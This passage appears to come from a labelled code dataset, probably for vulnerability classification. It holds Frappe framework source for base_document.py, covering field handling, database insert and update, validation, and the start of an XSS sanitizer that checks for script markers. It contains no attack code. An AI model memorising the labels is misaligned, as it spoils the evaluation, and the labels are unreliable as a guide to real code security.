raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 0}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and 